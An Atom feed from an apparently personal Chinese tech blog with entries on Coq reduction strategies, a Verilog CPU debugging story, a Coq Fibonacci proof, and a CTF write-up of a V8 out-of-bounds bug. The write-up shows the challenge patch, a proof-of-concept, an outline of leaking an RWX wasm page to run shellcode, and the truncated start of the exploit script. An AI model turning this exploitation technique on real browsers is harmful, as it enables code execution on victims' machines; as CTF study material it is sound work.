<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RWind</title>
  
  
  <link href="https://rw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://rw1nd.github.io/"/>
  <updated>2021-03-06T05:09:36.194Z</updated>
  <id>https://rw1nd.github.io/</id>
  
  <author>
    <name>RWind</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>coq中几种cbv归约方式</title>
    <link href="https://rw1nd.github.io/2021/03/05/coq-conversion/"/>
    <id>https://rw1nd.github.io/2021/03/05/coq-conversion/</id>
    <published>2021-03-05T15:13:26.000Z</published>
    <updated>2021-03-06T05:09:36.194Z</updated>
    
    <content type="html"><![CDATA[<p>coq中的cbv策略是先对函数的参数进行归约，这里做简单总结。</p><h2>$\delta$-归约</h2><p>若t是一个项， v是标识符且在上下文中值为t'， 则$\delta $-归约为 t{v/t'}。</p><p>第一个例子：</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Definition</span> <span class="type">Zsqr</span> (z:<span class="type">Z</span>) : <span class="type">Z</span> := z*z.</span><br><span class="line"><span class="type">Definition</span> ffun (f:<span class="type">Z</span>-&gt;<span class="type">Z</span>) (z:<span class="type">Z</span>) : <span class="type">Z</span> := f (f z).</span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv delta [ffun] <span class="keyword">in</span> (ffun <span class="type">Zsqr</span>).</span><br></pre></td></tr></table></figure></p><p>结果：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= (fun (f : Z -&gt; Z) (z : Z) =&gt; f (f z)) Zsqr</span><br><span class="line">: Z -&gt; Z</span><br></pre></td></tr></table></figure></p><p>第二个例子：</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Definition</span> <span class="type">Zsqr</span> (z:<span class="type">Z</span>) : <span class="type">Z</span> := z*z.</span><br><span class="line"><span class="type">Definition</span> ffun (f:<span class="type">Z</span>-&gt;<span class="type">Z</span>) (z:<span class="type">Z</span>) : <span class="type">Z</span> := f (f z).</span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv delta [ffun <span class="type">Zsqr</span>] <span class="keyword">in</span> (ffun <span class="type">Zsqr</span>).</span><br></pre></td></tr></table></figure></p><p>结果：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= (fun (f : Z -&gt; Z) (z : Z) =&gt; f (f z)) (fun z : Z =&gt; (z * z)%Z)</span><br><span class="line">: Z -&gt; Z</span><br></pre></td></tr></table></figure></p><p>第一个例子是将ffun的第一个类型为Z$\rightarrow$Z参数进行了归约，第二个例子则是对两个参数都进行了归约。</p><p><strong>符号表示</strong>：</p><p>$$E, \Gamma \vdash t \triangleright_{\delta} t'$$</p><h2>$\beta$-归约</h2><p>类似$\lambda$演算里面的application， 把(fun v: T =&gt; t) t'这种项，转换为 t{v/t'}。</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Definition</span> <span class="type">Zsqr</span> (z:<span class="type">Z</span>) : <span class="type">Z</span> := z*z.</span><br><span class="line"><span class="type">Definition</span> ffun (f:<span class="type">Z</span>-&gt;<span class="type">Z</span>) (z:<span class="type">Z</span>) : <span class="type">Z</span> := f (f z).</span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv beta delta [ffun <span class="type">Zsqr</span>] <span class="keyword">in</span> (ffun <span class="type">Zsqr</span>).</span><br></pre></td></tr></table></figure></p><p>这里先使用$\delta $-归约将参数进行展开，然后再用$\beta$-归约。</p><p>结果：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= fun z : Z =&gt; (z * z * (z * z))%Z</span><br><span class="line">: Z -&gt; Z</span><br></pre></td></tr></table></figure></p><p><strong>符号表示</strong>：</p><p>$$E, \Gamma \vdash t \triangleright_{\beta} t'$$</p><h2>$\zeta$-归约</h2><p>将局部绑定进行归约</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Section</span> local_def.</span><br><span class="line">  <span class="type">Variables</span> a b : <span class="type">Z</span>.</span><br><span class="line">  <span class="type">Let</span> x:<span class="type">Z</span> := a+b.</span><br><span class="line">  <span class="type">Let</span> y:<span class="type">Z</span> := a-b.</span><br><span class="line">  <span class="type">Definition</span> lfun : <span class="type">Z</span> := x*x + y*y.</span><br><span class="line"><span class="type">End</span> local_def.</span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv beta delta [lfun] <span class="keyword">in</span> (lfun <span class="number">3</span> <span class="number">2</span>).</span><br></pre></td></tr></table></figure></p><p>结果：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= let x := (3 + 2)%Z in let y := (3 - 2)%Z in (x * x + y * y)%Z</span><br><span class="line">: Z</span><br></pre></td></tr></table></figure></p><p>此时局部绑定并没有被归约，加上$\zeta$-归约后局部绑定被替换：</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Section</span> local_def.</span><br><span class="line">  <span class="type">Variables</span> a b : <span class="type">Z</span>.</span><br><span class="line">  <span class="type">Let</span> x:<span class="type">Z</span> := a+b.</span><br><span class="line">  <span class="type">Let</span> y:<span class="type">Z</span> := a-b.</span><br><span class="line">  <span class="type">Definition</span> lfun : <span class="type">Z</span> := x*x + y*y.</span><br><span class="line"><span class="type">End</span> local_def.</span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv zeta beta delta [lfun] <span class="keyword">in</span> (lfun <span class="number">3</span> <span class="number">2</span>).</span><br></pre></td></tr></table></figure></p><p>结果：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= ((3 + 2) * (3 + 2) + (3 - 2) * (3 - 2))%Z</span><br><span class="line">: Z</span><br></pre></td></tr></table></figure></p><p><strong>符号表示</strong>：</p><p>$$E, \Gamma \vdash t \triangleright_{\zeta} t'$$</p><h2>$\iota$-归约</h2><p>用来计算递归程序，<code>cbv iota beta zeta delta</code>和<code>compute</code>有相同含义。</p><p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Arith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">ZArith</span>.</span><br><span class="line"><span class="type">Require</span> <span class="type">Import</span> <span class="type">Bool</span>.</span><br><span class="line"></span><br><span class="line"><span class="type">Section</span> local_def.</span><br><span class="line">  <span class="type">Variables</span> a b : <span class="type">Z</span>.</span><br><span class="line">  <span class="type">Let</span> x:<span class="type">Z</span> := a+b.</span><br><span class="line">  <span class="type">Let</span> y:<span class="type">Z</span> := a-b.</span><br><span class="line">  <span class="type">Definition</span> lfun : <span class="type">Z</span> := x*x + y*y.</span><br><span class="line"><span class="type">End</span> local_def.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Eval</span> cbv iota beta zeta delta <span class="keyword">in</span> (lfun <span class="number">3</span> <span class="number">2</span>).</span><br><span class="line"><span class="type">Eval</span> compute <span class="keyword">in</span> (lfun <span class="number">3</span> <span class="number">2</span>).</span><br></pre></td></tr></table></figure></p><p>结果均为：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">= 26%Z</span><br><span class="line">: Z</span><br></pre></td></tr></table></figure></p><p><strong>符号表示</strong>：</p><p>$$E, \Gamma \vdash t \triangleright_{\iota} t'$$</p><p>参考资料：</p><p><a href="https://coq.inria.fr/refman/language/core/conversion.html" target="_blank" rel="noopener">https://coq.inria.fr/refman/language/core/conversion.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/32479842" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32479842</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;coq中的cbv策略是先对函数的参数进行归约，这里做简单总结。&lt;/p&gt;
&lt;h2&gt;$\delta$-归约&lt;/h2&gt;
&lt;p&gt;若t是一个项， v是标识符且在上下文中值为t&#39;， 则$\delta $-归约为 t{v/t&#39;}。&lt;/p&gt;
&lt;p&gt;第一个例子：&lt;/p&gt;
&lt;p&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="coq" scheme="https://rw1nd.github.io/tags/coq/"/>
    
    <category term="证明" scheme="https://rw1nd.github.io/tags/证明/"/>
    
  </entry>
  
  <entry>
    <title>记一次用verilog设计CPU踩的坑</title>
    <link href="https://rw1nd.github.io/2020/11/29/cpu-design/"/>
    <id>https://rw1nd.github.io/2020/11/29/cpu-design/</id>
    <published>2020-11-29T15:46:28.000Z</published>
    <updated>2020-11-30T08:43:19.796Z</updated>
    
    <content type="html"><![CDATA[<p>今天和同学讨论了一波CPU设计实现。这里记录一下此次的踩坑之旅。</p><h2>0x1</h2><p>对着仿真的时序，我们一起改了几个小bug之后发现出现了玄学的现象——回写阶段写不进regfile中，对着设计流水线的设计图看了一遍设计结构，没有发现问题。看了一遍每个模块的代码实现，没有发现问题。改testbench进行了一遍测试，没有发现问题，很是玄学。最后在反复的检查后，发现问题出在模块位宽定义不一致上。MIPS regfile我们定义的是32位， 寄存器地址应该是5位比如<code>reg [4:0] wn</code>，但是在写回阶段，MEM/WB模块寄存器地址位数写成了<code>reg [5:0] wb_wn</code>，导致数据位宽不一致👿。</p><h2>0x2</h2><p>本以为大功告成，结果发现还是不对，在data hazard的时候发现有问题。原来是指令译码的时候少了两个多路选择器，实例化后解决。</p><h2>0x3</h2><p>仿真已经没有问题了，后续只需Synthesis，Implementation，Generate Bitstream即可，没想到在Implementation阶段翻了车。报了一个错。</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The design is empty</span><br><span class="line">Resolution: Check if opt_design has removed all the leaf cells of your design.  Check whether you have instantiated and connected all of the top level ports.</span><br></pre></td></tr></table></figure></p><p>提示我在opt_design阶段，我的所有设计都被remove了。我们又检查了一遍源码，没有发现什么逻辑有问题的地方。在最后，抱着试一试的心态乱加了一些输出端口时，居然成功了。然后发现我们的顶层模块，只有输入接口，没有输出接口，在随便添加了一个输出接口后Implementation成功了。</p><p>后续进行了一下简单的测试：</p><p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> add(</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">16</span>:<span class="number">0</span>] a,</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">16</span>:<span class="number">0</span>] b,</span><br><span class="line">    <span class="keyword">input</span> cin,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">16</span>:<span class="number">0</span>] c,</span><br><span class="line">    <span class="keyword">output</span> cout</span><br><span class="line">    );</span><br><span class="line">   <span class="keyword">assign</span> &#123;cout,c&#125; = a + b + cin;</span><br><span class="line"><span class="keyword">endmodule</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> add3(</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">16</span>:<span class="number">0</span>] a1,</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">16</span>:<span class="number">0</span>] a2,</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">16</span>:<span class="number">0</span>] a3,</span><br><span class="line">    <span class="keyword">input</span> cin</span><br><span class="line"><span class="comment">//    output [16:0] b,</span></span><br><span class="line"><span class="comment">//    output cout</span></span><br><span class="line">);</span><br><span class="line">    <span class="keyword">wire</span> [<span class="number">16</span>:<span class="number">0</span>] rnum;</span><br><span class="line">    <span class="keyword">wire</span> rout;</span><br><span class="line">       </span><br><span class="line">    add add_one(</span><br><span class="line">        <span class="variable">.a</span> (a1),</span><br><span class="line">        <span class="variable">.b</span> (a2),</span><br><span class="line">        <span class="variable">.cin</span> (cin),</span><br><span class="line">        <span class="variable">.c</span> (rnum),</span><br><span class="line">        <span class="variable">.cout</span> (rout)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    add add_two(</span><br><span class="line">        <span class="variable">.a</span> (rnum),</span><br><span class="line">        <span class="variable">.b</span> (a3),</span><br><span class="line">        <span class="variable">.cin</span> (rout),</span><br><span class="line">        <span class="variable">.c</span> (b),</span><br><span class="line">        <span class="variable">.cout</span> (cout)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure></p><p>先定义一个简单的加法器模块，再通过实例两个加法器模块，之后把所有的输出注释掉。Implementation阶段果然出现了相同的错误。</p><p><img src="https://i.loli.net/2020/11/30/kPEzyA1WrpOe6tQ.png" alt="cpu_design1.png"></p><p>这里推测是opt_design之前的某个阶段判断模块没有输出，导致其认为模块为无用模块，可以将其优化掉，导致后续阶段认为design为空导致报错。</p><p>使用Tcl command定位了一波原因，发现<code>synth_design</code>后就已经被优化掉了。</p><h2>总结</h2><ul><li>位宽建议使用define定义</li></ul><p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">`<span class="meta-keyword">define</span> DATA_WIDTH 31</span></span><br></pre></td></tr></table></figure></p><ul><li>保证每个模块都有输入输出端口。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天和同学讨论了一波CPU设计实现。这里记录一下此次的踩坑之旅。&lt;/p&gt;
&lt;h2&gt;0x1&lt;/h2&gt;
&lt;p&gt;对着仿真的时序，我们一起改了几个小bug之后发现出现了玄学的现象——回写阶段写不进regfile中，对着设计流水线的设计图看了一遍设计结构，没有发现问题。看了一遍每个模</summary>
      
    
    
    
    
    <category term="CPU" scheme="https://rw1nd.github.io/tags/CPU/"/>
    
    <category term="verilog" scheme="https://rw1nd.github.io/tags/verilog/"/>
    
  </entry>
  
  <entry>
    <title>使用coq证明fibonacci数列迭代和递归两种实现形式等价</title>
    <link href="https://rw1nd.github.io/2020/11/26/coq-fibonacci-proof/"/>
    <id>https://rw1nd.github.io/2020/11/26/coq-fibonacci-proof/</id>
    <published>2020-11-26T04:58:47.000Z</published>
    <updated>2020-11-26T05:51:04.511Z</updated>
    
    <content type="html"><![CDATA[<p>fibonacci数列是数学上常见的一种数列。其定义为：</p><p>$$a_{0} = 0​$$</p><p>$$a_{1}=1$$</p><p>$$a_{n} = a_{n-1} + a_{n-2}$$</p><p>如果$a_{0}=0$, $a_{1}=1$，那么这个数列就为 0，1，1，2，3，5，8.....</p><p>在计算机中，一般有两种形式实现计算得到$a_{n}$。</p><p>第一种是通过递归的方式计算得到$a_{n}$：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Fixpoint fib (n : nat) : nat :=</span><br><span class="line">  match n with</span><br><span class="line">  | <span class="number">0</span> =&gt; <span class="number">0</span></span><br><span class="line">  | <span class="number">1</span> =&gt; <span class="number">1</span></span><br><span class="line">  | S (S n as n') =&gt; fib n' + fib n</span><br><span class="line">  end.</span><br></pre></td></tr></table></figure></p><p>第二种是通过迭代形式得到$a_{n}$：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fixpoint fib_aux (a b n : nat) : nat :=</span><br><span class="line">  match n with</span><br><span class="line">  | <span class="number">0</span> =&gt; a</span><br><span class="line">  | S n =&gt; fib_aux b (a + b) n</span><br><span class="line">  end.</span><br><span class="line">  </span><br><span class="line">Definition fib2 (n : nat) : nat := fib_aux <span class="number">0</span> <span class="number">1</span> n.</span><br></pre></td></tr></table></figure></p><p>现在要证明</p><p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Theorem fib_eq (n : nat) : fib2 n = fib n.</span><br></pre></td></tr></table></figure></p><p>为了后续证明的方便， 这里先证明一个引理：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Lemma fib_next_eq n:</span><br><span class="line">  forall a b,</span><br><span class="line">    fib_aux a b (S n) = a * fib n + b * fib (S n).</span><br><span class="line">Proof.</span><br><span class="line">  induction n.</span><br><span class="line">    - intros a b. simpl. ring.</span><br><span class="line">    - intros a b. change(fib_aux a b (S (S n))) with (fib_aux b (a+b) (S n)).</span><br><span class="line">      rewrite IHn. simpl. ring.</span><br><span class="line">Qed.</span><br></pre></td></tr></table></figure></p><p>接着就可以使用induction方法证明两者等价。</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Theorem fib_eq (n : nat) : fib2 n = fib n.</span><br><span class="line">Proof.</span><br><span class="line">  induction n.</span><br><span class="line">    - reflexivity.</span><br><span class="line">    - unfold fib2. rewrite fib_next_eq. ring.</span><br><span class="line">Qed.</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fibonacci数列是数学上常见的一种数列。其定义为：&lt;/p&gt;
&lt;p&gt;$$a_{0} = 0​$$&lt;/p&gt;
&lt;p&gt;$$a_{1}=1$$&lt;/p&gt;
&lt;p&gt;$$a_{n} = a_{n-1} + a_{n-2}$$&lt;/p&gt;
&lt;p&gt;如果$a_{0}=0$, $a_{1}=1$，</summary>
      
    
    
    
    
    <category term="coq" scheme="https://rw1nd.github.io/tags/coq/"/>
    
    <category term="证明" scheme="https://rw1nd.github.io/tags/证明/"/>
    
  </entry>
  
  <entry>
    <title>x-nuca2020-babyv8</title>
    <link href="https://rw1nd.github.io/2020/11/23/nuca2020-babyv8/"/>
    <id>https://rw1nd.github.io/2020/11/23/nuca2020-babyv8/</id>
    <published>2020-11-23T10:59:59.000Z</published>
    <updated>2020-11-23T13:06:13.792Z</updated>
    
    <content type="html"><![CDATA[<p>今年x-nuca出了一道v8题目，给出了patch文件：</p><p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc</span><br><span class="line">index 16fd384..8bf435a 100644</span><br><span class="line"><span class="comment">--- a/src/codegen/code-stub-assembler.cc</span></span><br><span class="line"><span class="comment">+++ b/src/codegen/code-stub-assembler.cc</span></span><br><span class="line">@@ -2888,7 +2888,7 @@ TNode&lt;Smi&gt; CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,</span><br><span class="line">       [&amp;](TNode&lt;Object&gt; arg) &#123;</span><br><span class="line">         TryStoreArrayElement(kind, &amp;pre_bailout, elements, var_length.value(),</span><br><span class="line">                              arg);</span><br><span class="line"><span class="deletion">-        Increment(&amp;var_length);</span></span><br><span class="line"><span class="addition">+        Increment(&amp;var_length, 3);</span></span><br><span class="line">       &#125;,</span><br><span class="line">       first);</span><br><span class="line">   &#123;</span><br></pre></td></tr></table></figure></p><p>可以看到，在使用Array的push方法时，数组长度就会增加3，导致OOB, poc如下：</p><p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oob_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">oob_arr.pop();</span><br><span class="line">oob_arr.push(<span class="number">1.4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(oob_arr.length);</span><br><span class="line"><span class="built_in">console</span>.log(oob_arr[<span class="number">4</span>]);</span><br></pre></td></tr></table></figure></p><p>接下来就是构造任意地址读写，通过leak出wasm的rwx的地址进行任意代码执行。</p><p>在构造过程中，通过OOB将array的<code>length</code>改大之后，可以读写后面的数据内容。</p><p><img src="https://i.loli.net/2020/11/23/mEBpHNzKuaJ8QVF.png" alt="babyv8-1.png"></p><p>可以leak出ArrayBuffer中heap的地址，通过<code>ArrayBuffer</code>构造任意地址读写，使用Heap Spray暴力把有用的数据leak出来。</p><p><img src="https://i.loli.net/2020/11/23/1EZTW3QNh2RSACr.png" alt="babyv8-2.png"></p><p>也可以通过再构造一个Array改写elements的指针来构造任意地址读写。</p><p><img src="https://i.loli.net/2020/11/23/X5sfHPTrn9kNVap.png" alt="babyv8-3.png"></p><p>为了能够leak rwx页的地址，构造一个object，将构造的function的地址leak出来。</p><p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vicobj = &#123;<span class="attr">marker</span>: <span class="string">'aaaaaa'</span>, <span class="attr">obj</span>:&#123;&#125;&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/11/23/bgY9A6KeGvINjL2.png" alt="babyv8-4.png"></p><p><code>vicobj.obj = f;</code>后，下图红框的高32位即可得到function的地址，之后通过OOB将地址leak出来即可。</p><p><img src="https://i.loli.net/2020/11/23/ldZxciAqWT96Rvr.png" alt="babyv8-5.png"></p><p>之后通过任意地址读一步步读出rwx页的地址后，将shellcode写到上面即可。</p><p>exp如下（shellcode为执行<code>/usr/bin/gnome-calculator</code>）:</p><p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span 